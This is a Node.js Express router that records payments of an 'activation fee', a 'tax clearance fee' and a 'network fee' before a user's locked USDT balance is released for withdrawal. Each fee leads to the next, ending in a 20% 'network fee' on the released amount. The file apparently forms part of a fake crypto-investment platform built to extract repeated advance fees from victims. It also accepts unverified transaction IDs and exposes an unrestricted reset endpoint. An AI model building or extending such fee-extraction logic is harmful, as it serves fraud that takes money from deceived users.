const express = require('express');
const router = express.Router();
const auth = require('../middleware/auth');
const User = require('../models/User');
const Withdrawal = require('../models/Withdrawal');

// Get user's fee status
router.get('/status', auth, async (req, res) => {
  try {
    const user = await User.findById(req.user.id);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    res.json({
      activationFee: user.activationFee,
      taxClearanceFee: user.taxClearanceFee,
      networkFee: user.networkFee
    });
  } catch (err) {
    console.error('Error fetching fee status:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// Pay activation fee
router.post('/pay-activation', auth, async (req, res) => {
  try {
    const { transactionId } = req.body;
    const user = await User.findById(req.user.id);
    
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    if (!user.activationFee.required) {
      return res.status(400).json({ error: 'No activation fee required' });
    }

    if (user.activationFee.paid) {
      return res.status(400).json({ error: 'Activation fee already paid' });
    }

    // Mark activation fee as paid
    user.activationFee.paid = true;
    user.activationFee.paidAt = new Date();
    user.activationFee.transactionId = transactionId || `ACT_${Date.now()}`;
    
    await user.save();

    res.json({
      success: true,
      message: 'Activation fee payment recorded successfully',
      activationFee: user.activationFee
    });
  } catch (err) {
    console.error('Error processing activation fee payment:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// Pay tax clearance fee
router.post('/pay-tax-clearance', auth, async (req, res) => {
  try {
    const { transactionId } = req.body;
    const user = await User.findById(req.user.id);
    
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    if (!user.taxClearanceFee.required) {
      return res.status(400).json({ error: 'No tax clearance fee required' });
    }

    if (user.taxClearanceFee.paid) {
      return res.status(400).json({ error: 'Tax clearance fee already paid' });
    }

    // Mark tax clearance fee as paid
    user.taxClearanceFee.paid = true;
    user.taxClearanceFee.paidAt = new Date();
    user.taxClearanceFee.transactionId = transactionId || `TAX_${Date.now()}`;
    
    await user.save();

    // Move funds from locked balance to processing (only if there's sufficient balance)
    let withdrawalCreated = false;
    let netAmount = 0;
    
    if (user.lockedBalance >= user.taxClearanceFee.amount) {
      netAmount = user.lockedBalance - user.taxClearanceFee.amount;
      
      if (netAmount > 0) {
        const withdrawal = new Withdrawal({
          userId: user._id,
          amount: netAmount,
          currency: 'USDT',
          network: 'ERC20',
          walletAddress: 'pending',
          status: 'processing',
          destination: 'available',
          type: 'regular'
        });

        await withdrawal.save();
        withdrawalCreated = true;
        
        // Set network fee requirement (20% of net amount)
        user.networkFee = {
          required: true,
          amount: netAmount * 0.2,
          paidAt: null
        };
      }
      
      user.lockedBalance = 0;
      await user.save();
    }

    const response = { 
      message: 'Tax clearance fee paid successfully',
      user: {
        taxClearanceFee: user.taxClearanceFee,
        networkFee: user.networkFee,
        lockedBalance: user.lockedBalance
      }
    };

    if (withdrawalCreated) {
      response.withdrawalCreated = true;
      response.netAmount = netAmount;
      response.networkFeeRequired = true;
      response.message += '. Funds moved to processing.';
    } else {
      response.withdrawalCreated = false;
      response.message += '. No locked balance to transfer.';
    }

    res.json(response);
  } catch (err) {
    console.error('Error processing tax clearance fee payment:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// Pay network fee
router.post('/pay-network', auth, async (req, res) => {
  try {
    const { transactionId } = req.body;
    const user = await User.findById(req.user.id);
    
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    if (!user.networkFee.required) {
      return res.status(400).json({ error: 'No network fee required' });
    }

    if (user.networkFee.paid) {
      return res.status(400).json({ error: 'Network fee already paid' });
    }

    // Mark network fee as paid
    user.networkFee.paid = true;
    user.networkFee.paidAt = new Date();
    user.networkFee.transactionId = transactionId || `NET_${Date.now()}`;
    
    await user.save();

    res.json({
      success: true,
      message: 'Network fee payment recorded successfully. Withdrawal will be processed shortly.',
      networkFee: user.networkFee
    });
  } catch (err) {
    console.error('Error processing network fee payment:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

// Reset all fees (admin use or for testing)
router.post('/reset', auth, async (req, res) => {
  try {
    const user = await User.findById(req.user.id);
    
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    // Reset all fees
    user.activationFee = {
      required: false,
      amount: 0,
      paid: false,
      paidAt: null,
      transactionId: '',
      reason: 'Activation fee required - profit exceeded margin'
    };

    user.taxClearanceFee = {
      required: false,
      amount: 0,
      paid: false,
      paidAt: null,
      transactionId: '',
      reason: 'Tax clearance fee required for balance transfer'
    };

    user.networkFee = {
      required: false,
      amount: 0,
      paid: false,
      paidAt: null,
      transactionId: '',
      reason: 'Network processing fee required'
    };
    
    await user.save();

    res.json({
      success: true,
      message: 'All fees have been reset',
      fees: {
        activationFee: user.activationFee,
        taxClearanceFee: user.taxClearanceFee,
        networkFee: user.networkFee
      }
    });
  } catch (err) {
    console.error('Error resetting fees:', err);
    res.status(500).json({ error: 'Server error' });
  }
});

module.exports = router;